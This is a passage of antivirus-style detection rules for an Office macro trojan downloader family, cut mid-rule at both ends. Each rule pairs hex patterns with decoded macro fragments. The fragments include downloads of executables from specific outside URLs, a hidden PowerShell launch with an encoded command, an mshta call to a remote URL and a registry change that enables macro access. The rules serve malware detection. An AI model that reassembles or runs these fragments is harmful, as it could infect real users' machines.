		$a_01_0 = {65 61 35 38 36 33 34 38 20 3d 20 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //01 00  ea586348 = Environ("temp") & "\main.theme"
		$a_01_1 = {66 33 64 66 63 30 35 62 2e 61 31 65 31 36 64 37 66 20 66 36 38 63 32 39 37 36 20 26 20 22 20 22 20 26 20 65 61 35 38 36 33 34 38 } //01 00  f3dfc05b.a1e16d7f f68c2976 & " " & ea586348
		$a_01_2 = {66 36 38 63 32 39 37 36 20 3d 20 65 30 30 30 39 65 35 39 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 29 } //01 00  f68c2976 = e0009e59(ActiveDocument.Shapes(1).Title)
		$a_01_3 = {43 61 6c 6c 20 66 39 62 35 31 36 33 38 2e 65 78 65 63 28 65 61 38 31 34 33 35 31 29 } //00 00  Call f9b51638.exec(ea814351)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_56{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {63 63 35 38 62 64 63 39 2e 61 37 30 64 31 36 34 33 20 62 32 64 33 63 35 36 33 20 26 20 22 20 22 20 26 20 65 38 33 65 66 61 65 35 } //01 00  cc58bdc9.a70d1643 b2d3c563 & " " & e83efae5
		$a_01_1 = {43 61 6c 6c 20 63 62 64 61 36 35 34 36 2e 65 78 65 63 28 66 61 33 31 34 66 61 36 29 } //01 00  Call cbda6546.exec(fa314fa6)
		$a_01_2 = {65 38 33 65 66 61 65 35 20 3d 20 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //01 00  e83efae5 = Environ("temp") & "\main.theme"
		$a_01_3 = {62 32 64 33 63 35 36 33 20 3d 20 65 63 30 63 64 37 62 34 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 29 } //00 00  b2d3c563 = ec0cd7b4(ActiveDocument.Shapes(1).Title)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_57{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {64 39 30 62 66 65 32 61 2e 65 65 30 36 65 34 31 36 20 63 30 30 63 64 66 64 63 20 26 20 22 20 22 20 26 20 65 63 36 35 31 61 39 35 } //01 00  d90bfe2a.ee06e416 c00cdfdc & " " & ec651a95
		$a_01_1 = {65 63 36 35 31 61 39 35 20 3d 20 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //01 00  ec651a95 = Environ("temp") & "\main.theme"
		$a_01_2 = {63 30 30 63 64 66 64 63 20 3d 20 62 35 65 35 31 33 36 66 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 29 } //01 00  c00cdfdc = b5e5136f(ActiveDocument.Shapes(1).Title)
		$a_01_3 = {43 61 6c 6c 20 64 63 31 35 66 64 66 31 2e 65 78 65 63 28 61 65 62 65 31 38 36 37 29 } //00 00  Call dc15fdf1.exec(aebe1867)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_58{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {64 63 30 65 36 32 65 66 2e 63 35 35 34 36 66 30 34 20 61 30 65 30 31 61 35 64 20 26 20 22 20 22 20 26 20 61 66 33 37 65 35 66 38 } //01 00  dc0e62ef.c5546f04 a0e01a5d & " " & af37e5f8
		$a_01_1 = {43 61 6c 6c 20 64 34 61 37 31 61 35 31 2e 65 78 65 63 28 63 32 37 31 62 36 65 36 29 } //01 00  Call d4a71a51.exec(c271b6e6)
		$a_01_2 = {61 66 33 37 65 35 66 38 20 3d 20 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //01 00  af37e5f8 = Environ("temp") & "\main.theme"
		$a_01_3 = {61 30 65 30 31 61 35 64 20 3d 20 63 65 61 37 38 64 36 31 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 29 } //00 00  a0e01a5d = cea78d61(ActiveDocument.Shapes(1).Title)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_59{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {6c 6c 6c 6c 6c 6c 6c 6c 6c 31 6c 2e 4f 70 65 6e 20 43 68 72 28 37 31 29 20 26 20 43 68 72 28 36 39 29 20 26 20 43 68 72 28 38 34 29 2c 20 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 31 2c 20 46 61 6c 73 65 } //01 00  lllllllll1l.Open Chr(71) & Chr(69) & Chr(84), llllllllll1, False
		$a_01_1 = {6f 53 74 72 65 61 6d 2e 53 61 76 65 54 6f 46 69 6c 65 20 43 68 72 28 39 37 29 20 26 20 43 68 72 28 31 30 30 29 20 26 20 43 68 72 28 39 38 29 20 26 20 43 68 72 28 34 36 29 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 31 32 30 29 20 26 20 43 68 72 28 31 30 31 29 2c 20 32 } //01 00  oStream.SaveToFile Chr(97) & Chr(100) & Chr(98) & Chr(46) & Chr(101) & Chr(120) & Chr(101), 2
		$a_01_2 = {6c 6c 6c 6c 6c 6c 6c 6c 6c 31 6c 2e 73 65 6e 64 } //00 00  lllllllll1l.send
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_60{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 02 00 "
		
	strings :
		$a_01_0 = {53 68 65 65 74 73 28 22 46 6f 67 6c 69 6f 32 22 29 2e 41 63 74 69 76 61 74 65 } //02 00  Sheets("Foglio2").Activate
		$a_01_1 = {3d 20 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 20 26 20 22 5c 5f 73 76 63 22 20 26 20 22 68 6f 73 74 2e 65 78 65 22 } //01 00  = ThisWorkbook.Path & "\_svc" & "host.exe"
		$a_01_2 = {3d 20 53 68 65 6c 6c 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 20 26 20 22 2e 5c 5f 73 76 63 22 20 26 20 22 68 6f 73 74 2e 65 78 65 20 22 20 26 20 22 2d 68 20 32 35 35 2e 32 35 35 2e 22 20 26 20 22 32 35 35 2e 32 35 35 22 20 26 20 22 20 2d 74 20 34 22 20 26 20 22 20 2d 70 20 38 30 22 2c 20 76 62 48 69 64 65 29 } //00 00  = Shell(ThisWorkbook.Path & ".\_svc" & "host.exe " & "-h 255.255." & "255.255" & " -t 4" & " -p 80", vbHide)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_61{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 } //01 00  = CreateObject("wscript.shell")
		$a_01_1 = {3d 20 65 38 30 38 39 39 39 38 2e 63 34 39 32 62 39 62 39 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 65 64 37 31 65 65 34 63 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 29 } //01 00  = e8089998.c492b9b9(ActiveDocument.Shapes(ed71ee4c).AlternativeText)
		$a_01_2 = {43 61 6c 6c 20 66 63 61 35 31 38 63 31 2e 65 78 65 63 28 61 30 34 66 36 31 33 61 29 } //01 00  Call fca518c1.exec(a04f613a)
		$a_01_3 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 20 2b 20 22 20 22 20 2b 20 66 35 64 31 31 32 61 30 } //00 00  = ActiveDocument.Shapes(1).Title + " " + f5d112a0
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_62{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 62 31 34 65 63 62 37 65 28 22 63 31 3a 35 5c 32 70 31 72 34 6f 39 67 34 72 34 61 61 6d 33 64 32 61 63 74 33 61 36 5c 66 32 64 36 66 33 37 36 32 38 66 2e 62 6a 31 70 36 67 35 22 29 } //01 00  = b14ecb7e("c1:5\2p1r4o9g4r4aam3d2act3a6\f2d6f37628f.bj1p6g5")
		$a_01_1 = {53 65 74 20 66 35 35 36 63 31 31 65 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 } //01 00  Set f556c11e = CreateObject("wscript.shell")
		$a_01_2 = {64 32 64 37 35 31 39 34 2e 61 64 61 32 62 37 63 33 20 66 35 35 36 63 31 31 65 2c 20 62 31 34 65 63 62 37 65 28 22 65 32 78 39 65 62 63 31 22 29 2c 20 64 39 62 64 36 34 62 32 20 26 20 22 20 22 20 26 20 65 37 35 61 35 36 62 61 } //00 00  d2d75194.ada2b7c3 f556c11e, b14ecb7e("e2x9ebc1"), d9bd64b2 & " " & e75a56ba
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_63{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 } //01 00  Sub Document_Open()
		$a_01_1 = {43 61 6c 6c 20 52 65 65 6e 6a 6f 69 6e } //01 00  Call Reenjoin
		$a_01_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 22 20 26 20 22 6d 74 73 3a 5c 5c 22 20 26 20 22 2e 22 20 26 20 22 5c 72 6f 22 20 26 20 22 6f 74 5c 63 69 6d 22 20 26 20 22 76 32 22 20 26 20 22 3a 22 20 26 20 22 57 69 6e 33 22 20 26 20 22 32 5f 50 72 6f 63 65 73 73 22 29 } //01 00  = GetObject("winmg" & "mts:\\" & "." & "\ro" & "ot\cim" & "v2" & ":" & "Win3" & "2_Process")
		$a_01_3 = {3d 20 53 74 72 43 6f 6e 76 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 77 33 38 65 61 34 38 65 32 63 62 22 29 2e 56 61 6c 75 65 } //00 00  = StrConv(ActiveDocument.Variables("w38ea48e2cb").Value
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_64{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 } //01 00  Sub Document_Open()
		$a_01_1 = {43 61 6c 6c 20 56 69 73 63 6f 6d 65 74 72 79 } //01 00  Call Viscometry
		$a_01_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 22 20 26 20 22 6d 74 73 3a 5c 5c 22 20 26 20 22 2e 22 20 26 20 22 5c 72 6f 22 20 26 20 22 6f 74 5c 63 69 6d 22 20 26 20 22 76 32 22 20 26 20 22 3a 22 20 26 20 22 57 69 6e 33 22 20 26 20 22 32 5f 50 72 6f 63 65 73 73 22 29 } //01 00  = GetObject("winmg" & "mts:\\" & "." & "\ro" & "ot\cim" & "v2" & ":" & "Win3" & "2_Process")
		$a_01_3 = {3d 20 53 74 72 43 6f 6e 76 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 7a 64 64 39 35 37 35 64 62 62 38 22 29 2e 56 61 6c 75 65 } //00 00  = StrConv(ActiveDocument.Variables("zdd9575dbb8").Value
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_65{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {28 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 6d 6b 64 69 72 20 63 3a 5c 74 65 6d 70 22 29 } //01 00  ("powershell.exe mkdir c:\temp")
		$a_01_1 = {28 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 61 74 74 72 69 62 20 2b 68 20 2b 73 20 63 3a 5c 74 65 6d 70 22 29 2c 20 30 } //01 00  ("powershell.exe attrib +h +s c:\temp"), 0
		$a_03_2 = {3d 20 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 22 68 74 74 70 3a 2f 2f 34 35 2e 33 32 2e 32 31 38 2e 31 34 2f 72 61 6c 69 2e 65 78 65 22 2c 20 22 63 3a 5c 74 65 6d 70 5c 90 02 08 2e 65 78 65 22 29 90 00 } //01 00 
		$a_03_3 = {70 6f 77 65 72 73 68 65 6c 6c 2e 52 75 6e 20 22 63 6d 64 20 2f 4b 20 43 3a 5c 74 65 6d 70 5c 90 02 08 2e 65 78 65 22 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_66{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 6f 6b 76 75 6d 79 67 70 69 68 76 65 28 22 34 33 33 61 35 63 35 37 36 39 36 65 36 34 36 66 37 37 37 33 35 63 35 33 37 39 37 33 37 34 36 35 36 64 33 33 33 32 35 63 36 64 37 33 36 38 37 34 36 31 32 65 36 35 37 38 36 35 32 30 36 38 37 34 37 34 37 30 37 33 33 61 32 66 32 66 37 37 37 37 37 37 32 65 36 64 36 39 36 65 37 30 36 39 36 33 32 65 36 34 36 35 32 66 36 62 32 66 36 32 36 33 36 34 36 65 32 66 37 30 36 63 22 29 } //01 00  Shell okvumygpihve("433a5c57696e646f77735c53797374656d33325c6d736874612e6578652068747470733a2f2f7777772e6d696e7069632e64652f6b2f6263646e2f706c")
		$a_01_1 = {3d 20 6f 6b 76 75 6d 79 67 70 69 68 76 65 20 26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 75 74 6b 62 6c 68 67 73 65 66 76 66 2c 20 73 7a 68 74 64 62 6e 6c 6b 66 6c 78 2c 20 32 29 } //00 00  = okvumygpihve & Chr$(Val("&H" & Mid$(utkblhgsefvf, szhtdbnlkflx, 2)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_67{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 3a 5c 22 22 20 26 20 43 68 61 72 28 38 30 29 20 26 20 43 68 61 72 28 38 32 29 20 26 20 22 22 4f 47 52 41 4d 44 41 54 41 5c 61 2e 22 22 26 43 48 41 52 28 31 30 31 29 26 22 22 78 65 } //01 00  C:\"" & Char(80) & Char(82) & ""OGRAMDATA\a.""&CHAR(101)&""xe
		$a_01_1 = {3d 43 41 4c 4c 28 22 22 75 72 22 22 26 43 48 41 52 28 31 30 38 29 26 22 22 6d 6f 6e 22 22 2c 22 22 55 52 22 22 26 43 48 41 52 28 37 36 29 26 22 22 44 6f 77 6e 22 22 26 43 48 41 52 28 31 30 38 29 26 22 22 6f 61 64 54 6f 46 69 22 22 26 43 48 41 52 28 31 30 38 29 } //01 00  =CALL(""ur""&CHAR(108)&""mon"",""UR""&CHAR(76)&""Down""&CHAR(108)&""oadToFi""&CHAR(108)
		$a_01_2 = {68 74 74 70 73 3a 2f 2f 72 65 6c 69 67 6f 6e 63 6c 6f 74 68 65 73 2e 63 6f 6d 2f 74 65 73 74 32 2e 65 78 65 } //01 00  https://religonclothes.com/test2.exe
		$a_01_3 = {45 78 63 65 6c 53 68 65 65 74 2e 52 75 6e 20 66 61 63 6b 79 6f 75 } //00 00  ExcelSheet.Run fackyou
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_68{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 5c 5c 2e 5c 72 6f 6f 74 5c 63 69 6d 76 32 22 29 } //01 00  = GetObject("winmgmts:\\.\root\cimv2")
		$a_01_1 = {2e 45 78 65 63 51 75 65 72 79 28 22 53 45 4c 45 43 54 20 2a 20 46 52 4f 4d 20 57 69 6e 33 32 5f 4e 65 74 77 6f 72 6b 41 64 61 70 74 65 72 22 29 } //01 00  .ExecQuery("SELECT * FROM Win32_NetworkAdapter")
		$a_01_2 = {3d 20 52 65 70 6c 61 63 65 28 5a 59 58 4d 49 59 4f 2e 4d 41 43 41 64 64 72 65 73 73 2c 20 22 3a 22 2c 20 22 22 29 } //01 00  = Replace(ZYXMIYO.MACAddress, ":", "")
		$a_03_3 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 41 74 74 61 63 68 65 64 54 65 6d 70 6c 61 74 65 20 3d 20 22 68 74 74 70 3a 2f 2f 77 6f 72 64 2d 6c 69 73 2e 6d 79 66 74 70 2e 6f 72 67 2f 22 20 2b 20 90 02 10 20 2b 20 22 2f 56 6d 68 65 56 66 71 47 78 47 58 2e 64 6f 74 22 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_69{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {46 69 6c 65 50 61 74 68 20 3d 20 22 43 3a 5c 74 65 6d 70 5c 70 61 79 6c 6f 61 64 2e 76 62 73 22 } //01 00  FilePath = "C:\temp\payload.vbs"
		$a_01_1 = {53 65 74 20 57 69 6e 48 74 74 70 52 65 71 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 22 4d 69 63 72 6f 73 6f 66 74 2e 58 4d 4c 48 54 54 50 22 22 29 } //01 00  Set WinHttpReq = CreateObject(""Microsoft.XMLHTTP"")
		$a_01_2 = {53 65 74 20 57 73 68 53 68 65 6c 6c 20 3d 20 57 53 63 72 69 70 74 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 22 29 } //01 00  Set WshShell = WScript.CreateObject(""WScript.Shell"")
		$a_01_3 = {57 73 68 53 68 65 6c 6c 2e 52 75 6e 20 22 22 63 3a 5c 74 65 6d 70 5c 6e 6f 74 65 77 72 69 74 65 72 2e 65 78 65 22 22 22 } //01 00  WshShell.Run ""c:\temp\notewriter.exe"""
		$a_01_4 = {53 68 65 6c 6c 20 22 77 73 63 72 69 70 74 20 63 3a 5c 74 65 6d 70 5c 70 61 79 6c 6f 61 64 2e 76 62 73 22 } //00 00  Shell "wscript c:\temp\payload.vbs"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_70{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 08 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 61 75 6e 61 69 64 75 61 69 73 64 75 68 61 69 73 75 68 64 61 69 73 75 68 64 61 69 73 75 64 68 69 61 73 68 64 69 61 73 68 64 69 61 75 73 68 64 69 61 75 73 68 64 69 75 61 73 64 61 73 68 3d 3d 22 } //01 00  = "aunaiduaisduhaisuhdaisuhdaisudhiashdiashdiaushdiaushdiuasdash=="
		$a_01_1 = {3d 20 22 70 6f 22 } //01 00  = "po"
		$a_01_2 = {3d 20 22 77 65 72 22 } //01 00  = "wer"
		$a_01_3 = {3d 20 22 53 68 45 22 } //01 00  = "ShE"
		$a_01_4 = {3d 20 22 6c 6c 22 } //01 00  = "ll"
		$a_01_5 = {2b 20 22 20 2d 6e 6f 70 20 2d 77 49 6e 20 68 69 44 64 45 6e 20 2d 65 70 20 62 79 70 61 73 73 20 2d 65 6e 63 20 22 } //01 00  + " -nop -wIn hiDdEn -ep bypass -enc "
		$a_01_6 = {2b 20 22 22 20 2b 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 } //01 00  + "" + ActiveDocument.BuiltInDocumentProperties("
		$a_03_7 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 90 01 02 29 2e 52 75 6e 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_71{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 48 4b 45 59 5f 43 55 52 52 45 4e 54 5f 55 53 45 52 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 4f 66 66 69 63 65 5c 22 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 56 65 72 73 69 6f 6e 20 26 20 22 5c 57 6f 72 64 5c 53 65 63 75 72 69 74 79 5c 41 63 63 65 73 73 56 42 4f 4d 22 } //01 00  = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security\AccessVBOM"
		$a_01_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 22 2c 20 22 77 6f 72 64 2e 61 70 70 6c 69 63 61 74 69 6f 6e 22 29 } //01 00  = GetObject("", "word.application")
		$a_03_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 90 02 15 28 22 6c 6c 65 68 73 2e 74 70 69 72 63 73 77 22 29 29 2e 52 65 67 57 72 69 74 65 28 90 02 19 2c 20 31 2c 20 22 52 45 47 5f 44 57 4f 52 44 22 29 90 00 } //01 00 
		$a_03_3 = {3d 20 4d 69 64 28 90 02 19 2c 20 90 02 19 2c 20 31 30 30 30 30 30 30 29 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_72{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 68 74 74 70 73 3a 2f 2f 6b 69 74 68 75 61 74 70 68 61 6e 6d 65 6d 2e 30 30 30 77 65 62 68 6f 73 74 61 70 70 2e 63 6f 6d 2f 63 68 61 72 65 2f 74 65 73 74 2e 7a 69 70 22 } //01 00  = "https://kithuatphanmem.000webhostapp.com/chare/test.zip"
		$a_01_1 = {53 61 76 65 42 69 6e 61 72 79 44 61 74 61 20 22 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 55 73 65 72 20 26 20 22 5c 44 6f 63 75 6d 65 6e 74 73 5c 74 65 73 74 2e 7a 69 70 22 2c 20 6f 62 6a 57 69 6e 48 74 74 70 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79 } //01 00  SaveBinaryData "C:\Users\" & User & "\Documents\test.zip", objWinHttp.responseBody
		$a_01_2 = {6f 53 68 65 6c 6c 2e 52 75 6e 20 22 63 6d 64 2e 65 78 65 20 2f 52 20 63 64 20 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 55 73 65 72 20 26 20 22 5c 44 6f 63 75 6d 65 6e 74 73 5c 54 65 73 74 5c 6e 65 74 63 6f 72 65 61 70 70 33 2e 31 20 26 26 20 43 6f 6f 6b 69 65 56 69 72 75 73 2e 65 78 65 22 } //00 00  oShell.Run "cmd.exe /R cd C:\Users\" & User & "\Documents\Test\netcoreapp3.1 && CookieVirus.exe"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_73{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 22 70 75 74 74 79 2e 76 62 73 22 22 2c 20 32 20 22 20 26 20 76 62 43 72 4c 66 } //01 00  .savetofile ""putty.vbs"", 2 " & vbCrLf
		$a_01_1 = {6f 62 6a 53 68 65 6c 6c 2e 52 75 6e 20 28 22 22 70 75 74 74 79 2e 76 62 73 22 22 29 22 20 26 20 76 62 43 72 4c 66 } //01 00  objShell.Run (""putty.vbs"")" & vbCrLf
		$a_01_2 = {53 65 74 20 6f 62 6a 57 4d 49 53 65 72 76 69 63 65 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 22 22 77 69 6e 6d 67 6d 74 73 3a 5c 5c 22 22 20 26 20 73 74 72 43 6f 6d 70 75 74 65 72 20 26 20 22 22 5c 72 6f 6f 74 5c 63 69 6d 76 32 22 22 29 22 20 26 20 76 62 43 72 4c 66 } //01 00  Set objWMIService = GetObject(""winmgmts:\\"" & strComputer & ""\root\cimv2"")" & vbCrLf
		$a_01_3 = {2e 46 69 6c 65 45 78 69 73 74 73 28 45 6e 76 69 72 6f 6e 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 2b 20 22 5c 44 6f 63 75 6d 65 6e 74 73 5c 22 20 2b 20 22 74 4c 4c 73 6d 34 57 32 2e 74 78 74 22 29 } //00 00  .FileExists(Environ("USERPROFILE") + "\Documents\" + "tLLsm4W2.txt")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_74{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {66 6e 61 67 67 6d 6a 79 6c 68 75 20 3d 20 22 63 6d 64 2e 65 78 65 20 2f 63 22 20 26 20 22 43 6d 44 20 63 6d 72 61 78 6c 71 22 20 26 20 22 20 63 6d 64 20 22 20 26 20 22 2f 72 22 20 26 20 5f } //01 00  fnaggmjylhu = "cmd.exe /c" & "CmD cmraxlq" & " cmd " & "/r" & _
		$a_01_1 = {62 20 26 20 63 20 26 20 22 77 65 72 73 68 65 6c 6c 20 22 20 26 20 22 28 4e 45 77 2d 6f 62 6a 45 22 20 26 20 6c 6c 6c 20 26 20 22 74 20 22 20 26 20 22 73 79 73 74 65 6d 2e 6e 65 74 2e 77 45 42 63 6c 49 65 6e 54 29 2e 44 6f 77 6e 4c 6f 41 64 66 49 6c 45 22 20 26 20 22 } //01 00  b & c & "wershell " & "(NEw-objE" & lll & "t " & "system.net.wEBclIenT).DownLoAdfIlE" & "
		$a_01_2 = {68 74 74 70 73 3a 2f 2f 72 61 77 2e 67 69 74 68 75 62 75 73 65 72 63 6f 6e 74 65 6e 74 2e 63 6f 6d 2f 66 61 72 61 6f 31 35 2f 6a 6a 2f 6d 61 73 74 65 72 2f 66 69 6e 61 2e 6a 70 67 } //01 00  https://raw.githubusercontent.com/farao15/jj/master/fina.jpg
		$a_01_3 = {24 45 4e 76 3a 54 45 4d 50 5c 71 61 77 73 70 6c 73 71 66 72 2e 76 62 73 } //00 00  $ENv:TEMP\qawsplsqfr.vbs
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_75{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 69 63 72 6f 73 6f 66 74 2e 58 4d 4c 48 54 54 50 22 29 } //01 00  = CreateObject("Microsoft.XMLHTTP")
